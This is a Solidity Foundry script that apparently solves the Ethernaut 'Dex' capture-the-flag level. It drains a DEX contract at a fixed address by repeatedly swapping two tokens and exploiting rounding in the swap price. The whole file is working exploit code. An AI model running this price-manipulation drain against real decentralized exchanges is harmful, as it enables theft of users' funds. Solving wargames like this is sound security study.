// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {Dex} from "../src/Dex.sol";
import {Script, console} from "forge-std/Script.sol";

contract DexSolution is Script {
    Dex dex = Dex(0x804D05515A5eBd830066A2849Cc9a134f587aE30);
    address myAddress = vm.envAddress("MY_ADDRESS");
    address token1 = dex.token1();
    address token2 = dex.token2();

    function run() public {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        getAllFound();
        vm.stopBroadcast();
    }

    function getAllFound() internal {
        for (uint8 i = 0; i < 3; i++) {
            swapFristToken();
            swapSecontoken();
        }
    }

    function swapFristToken() internal {
        uint256 balanceFirstToken = dex.balanceOf(token1, myAddress);
        if (balanceFirstToken > dex.balanceOf(token1, address(dex))) {
            balanceFirstToken = dex.balanceOf(token1, address(dex));
        }
        dex.approve(address(dex), balanceFirstToken);
        dex.swap(token1, token2, balanceFirstToken);
    }

    function swapSecontoken() internal {
        uint256 balanceSecondtoken = dex.balanceOf(token2, myAddress);

        if (balanceSecondtoken > dex.balanceOf(token2, address(dex))) {
            balanceSecondtoken = dex.balanceOf(token2, address(dex));
        }
        dex.approve(address(dex), balanceSecondtoken);
        dex.swap(token2, token1, balanceSecondtoken);
    }
}
